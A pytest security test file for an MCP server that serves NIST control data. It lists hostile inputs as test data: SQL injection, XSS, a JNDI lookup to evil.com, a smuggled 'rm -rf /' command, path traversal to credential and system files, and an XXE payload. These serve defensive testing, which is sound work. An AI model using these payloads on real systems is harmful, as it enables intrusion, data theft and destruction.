"""
Security Tests for NIST MCP Server

Tests for security vulnerabilities and secure coding practices.
"""

import json
import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, mock_open, patch

import pytest

from nist_mcp.data.loader import NISTDataLoader
from nist_mcp.server import NISTMCPServer


class TestInputValidation:
    """Tests for input validation and sanitization"""

    @pytest.mark.asyncio
    async def test_control_id_injection_protection(self):
        """Test protection against injection attacks in control IDs"""
        server = NISTMCPServer()

        # Test various injection attempts
        malicious_inputs = [
            "'; DROP TABLE controls; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "AC-1\x00hidden",
            "AC-1\n\rinjected",
            "AC-1' OR '1'='1",
            "${jndi:ldap://evil.com/}",
            "AC-1\"; import os; os.system('rm -rf /')",
        ]

        with (
            patch.object(
                server.loader, "load_controls", new_callable=AsyncMock
            ) as mock_load,
            patch.object(server.loader, "get_control_by_id") as mock_get,
        ):
            mock_load.return_value = {"catalog": {"controls": []}}
            mock_get.return_value = None

            for malicious_input in malicious_inputs:
                # Should handle malicious input gracefully
                try:
                    result = await server.get_control_details(malicious_input)
                    # If no exception, result should be None or raise ValueError
                    assert result is None
                except ValueError:
                    # Expected behavior for invalid control IDs
                    pass
                except Exception as e:
                    # Should not raise unexpected exceptions
                    pytest.fail(
                        f"Unexpected exception for input '{malicious_input}': {e}"
                    )

    @pytest.mark.asyncio
    async def test_path_traversal_protection(self):
        """Test protection against path traversal attacks"""
        # Test with malicious data paths
        malicious_paths = [
            Path("../../etc/passwd"),
            Path("/etc/passwd"),
            Path("../../../root/.ssh/id_rsa"),
            Path("..\\..\\windows\\system32\\config\\sam"),
            Path("/proc/self/environ"),
        ]

        for malicious_path in malicious_paths:
            server = NISTMCPServer(data_path=malicious_path)

            # Should not allow access to system files
            with patch("pathlib.Path.exists", return_value=False):
                with pytest.raises(FileNotFoundError):
                    await server.loader.initialize()

    def test_json_parsing_security(self):
        """Test JSON parsing security against malicious payloads"""
        loader = NISTDataLoader(Path("/test"))

        # Test various malicious JSON payloads
        malicious_json_payloads = [
            '{"__proto__": {"isAdmin": true}}',  # Prototype pollution
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            '{"a": "' + "x" * 1000000 + '"}',  # Large string DoS
            '{"a": [' + ",".join(["1"] * 100000) + "]}",  # Large array DoS
        ]

        for payload in malicious_json_payloads:
            try:
                # Should handle malicious JSON safely
                parsed = json.loads(payload)
                # Verify no prototype pollution occurred
                assert not hasattr({}, "isAdmin")
            except (json.JSONDecodeError, MemoryError):
                # Expected for some malicious payloads
                pass

    @pytest.mark.asyncio
    async def test_file_access_restrictions(self):
        """Test that file access is properly restricted"""
        loader = NISTDataLoader(Path("/test/data"))

        # Mock file operations to test access patterns
        with patch(
            "aiofiles.open", mock_open(read_data='{"test": "data"}')
        ) as mock_file:
            # Should only access files within the data directory
            await loader.load_controls()

            # Verify file access patterns
            for call in mock_file.call_args_list:
                file_path = str(call[0][0])
                # Should not access files outside data directory
                assert not file_path.startswith("/etc/")
                assert not file_path.startswith("/root/")
                assert not file_path.startswith("/home/")
                assert ".." not in file_path


class TestDataIntegrity:
    """Tests for data integrity and validation"""

    @pytest.mark.asyncio
    async def test_json_schema_validation(self):
        """Test JSON schema validation for NIST data"""
        loader = NISTDataLoader(Path("/test"))

        # Test with invalid NIST data structure
        invalid_data_samples = [
            '{"invalid": "structure"}',  # Missing required fields
            '{"catalog": "not_an_object"}',  # Wrong type
            '{"catalog": {"controls": "not_an_array"}}',  # Wrong controls type
            '{"catalog": {"controls": [{"id": 123}]}}',  # Wrong ID type
        ]

        for invalid_data in invalid_data_samples:
            with patch("aiofiles.open", mock_open(read_data=invalid_data)):
                with patch.object(Path, "exists", return_value=True):
                    try:
                        result = await loader.load_controls()
                        # If parsing succeeds, validate the structure
                        if "catalog" in result:
                            assert isinstance(result["catalog"], dict)
                            if "controls" in result["catalog"]:
                                assert isinstance(result["catalog"]["controls"], list)
                    except (json.JSONDecodeError, KeyError, TypeError):
                        # Expected for invalid data
                        pass

    @pytest.mark.asyncio
    async def test_xml_parsing_security(self):
        """Test XML parsing security (XXE protection)"""
        loader = NISTDataLoader(Path("/test"))

        # Test XXE attack payload
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <catalog>
            <control id="&xxe;">
                <title>Malicious Control</title>
            </control>
        </catalog>"""

        with patch("aiofiles.open", mock_open(read_data=xxe_payload)):
            with patch.object(Path, "exists", return_value=True):
                try:
                    # Should not process XXE entities
                    result = await loader._parse_controls_xml(
                        Path("/test/controls.xml")
                    )

                    # Verify no sensitive data was included
                    if result and "catalog" in result:
                        controls = result["catalog"].get("controls", [])
                        for control in controls:
                            control_id = control.get("id", "")
                            # Should not contain file contents
                            assert "root:" not in control_id
                            assert "/bin/bash" not in control_id
                except Exception:
                    # XML parsing might fail, which is acceptable
                    pass

    def test_control_id_format_validation(self):
        """Test control ID format validation"""
        loader = NISTDataLoader(Path("/test"))

        # Test various control ID formats
        valid_ids = ["AC-1", "AU-2", "SC-7", "SI-4(1)", "AC-2(1)(a)"]
        invalid_ids = ["", "INVALID", "AC", "AC-", "AC-999999", "AC-1-INVALID"]

        controls_data = {
            "catalog": {
                "controls": [
                    {"id": "AC-1", "title": "Valid Control"},
                    {"id": "AU-2", "title": "Another Valid Control"},
                ]
            }
        }

        # Test valid IDs
        for valid_id in valid_ids:
            # Should handle valid IDs without issues
            result = loader.get_control_by_id(controls_data, valid_id)
            # Result can be None if control doesn't exist, but no exception should occur

        # Test invalid IDs
        for invalid_id in invalid_ids:
            # Should handle invalid IDs gracefully
            result = loader.get_control_by_id(controls_data, invalid_id)
            # Should return None for invalid/non-existent IDs


class TestNetworkSecurity:
    """Tests for network security aspects"""

    @pytest.mark.asyncio
    async def test_url_validation_in_download_script(self):
        """Test URL validation in download operations"""
        from scripts.download_nist_data import NISTDataDownloader

        downloader = NISTDataDownloader(Path("/test"))

        # Test with malicious URLs
        malicious_sources = {
            "malicious": {
                "url": "file:///etc/passwd",
                "description": "Local file access attempt",
                "path": "test.json",
            },
            "redirect": {
                "url": "http://evil.com/redirect",
                "description": "Malicious redirect",
                "path": "test.json",
            },
        }

        for source_id, source_info in malicious_sources.items():
            # Should validate URLs and reject malicious ones
            with patch("urllib.request.urlopen") as mock_urlopen:
                mock_urlopen.side_effect = Exception("Blocked malicious URL")

                result = downloader._download_source(source_id, source_info, force=True)
                assert result is False  # Should fail for malicious URLs

    def test_https_enforcement(self):
        """Test that HTTPS is enforced for downloads"""
        from scripts.download_nist_data import NISTDataDownloader

        # Check that all official data sources use HTTPS
        for source_id, source_info in NISTDataDownloader.DATA_SOURCES.items():
            url = source_info["url"]
            assert url.startswith(
                "https://"
            ), f"Source {source_id} does not use HTTPS: {url}"


class TestPrivacyAndDataHandling:
    """Tests for privacy and data handling"""

    def test_no_sensitive_data_logging(self):
        """Test that sensitive data is not logged"""
        import logging
        from io import StringIO

        # Capture log output
        log_capture = StringIO()
        handler = logging.StreamHandler(log_capture)
        logger = logging.getLogger("nist_mcp")
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)

        server = NISTMCPServer()

        # Simulate operations that might log data
        sample_control = {
            "id": "AC-1",
            "title": "Access Control Policy",
            "parts": [{"prose": "Sensitive implementation details"}],
        }

        # Log some operations
        logger.info(f"Processing control: {sample_control['id']}")
        logger.debug(f"Control title: {sample_control['title']}")

        log_output = log_capture.getvalue()

        # Should log control IDs and titles (public info) but not sensitive details
        assert "AC-1" in log_output
        assert "Access Control Policy" in log_output
        # Should not log potentially sensitive implementation details
        assert "Sensitive implementation details" not in log_output

    def test_data_minimization(self):
        """Test that only necessary data is processed and stored"""
        server = NISTMCPServer()

        # Test that server doesn't store unnecessary user data
        assert not hasattr(server, "user_data")
        assert not hasattr(server, "session_data")
        assert not hasattr(server, "request_history")

        # Test that loader only caches necessary data
        loader = server.loader
        cache_attributes = [attr for attr in dir(loader) if attr.endswith("_cache")]

        # Should only have expected caches
        expected_caches = [
            "_controls_cache",
            "_csf_cache",
            "_mappings_cache",
            "_schemas_cache",
        ]
        for cache_attr in cache_attributes:
            assert cache_attr in expected_caches, f"Unexpected cache: {cache_attr}"

    @pytest.mark.asyncio
    async def test_temporary_file_cleanup(self):
        """Test that temporary files are properly cleaned up"""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            server = NISTMCPServer(data_path=temp_path)

            # Create some temporary files
            temp_file = temp_path / "temp_data.json"
            temp_file.write_text('{"test": "data"}')

            # Verify file exists
            assert temp_file.exists()

            # After operations, temporary files should be cleaned up
            # (This would be implementation-specific)
            # For now, just verify the server doesn't leave sensitive data around

            # Check that no sensitive data is left in memory
            import gc

            gc.collect()  # Force garbage collection

            # Server should not retain references to temporary data
            assert not hasattr(server, "_temp_data")


class TestErrorHandlingSecurity:
    """Tests for secure error handling"""

    @pytest.mark.asyncio
    async def test_error_message_sanitization(self):
        """Test that error messages don't leak sensitive information"""
        server = NISTMCPServer()

        with patch.object(
            server.loader, "load_controls", new_callable=AsyncMock
        ) as mock_load:
            # Simulate error with potentially sensitive path information
            mock_load.side_effect = FileNotFoundError(
                "/sensitive/path/to/secret/file.json not found"
            )

            try:
                await server.list_nist_controls()
            except Exception as e:
                error_message = str(e)
                # Error message should not contain sensitive path information
                assert "/sensitive/path" not in error_message
                assert "secret" not in error_message

    @pytest.mark.asyncio
    async def test_exception_information_disclosure(self):
        """Test that exceptions don't disclose internal information"""
        server = NISTMCPServer()

        with patch.object(server.loader, "get_control_by_id") as mock_get:
            # Simulate internal error
            mock_get.side_effect = Exception(
                "Internal database connection failed: user=admin, password=secret123"
            )

            with patch.object(
                server.loader, "load_controls", new_callable=AsyncMock
            ) as mock_load:
                mock_load.return_value = {"catalog": {"controls": []}}

                try:
                    await server.get_control_details("AC-1")
                except Exception as e:
                    error_message = str(e)
                    # Should not expose internal credentials or sensitive info
                    assert "password" not in error_message.lower()
                    assert "secret123" not in error_message
                    assert "admin" not in error_message
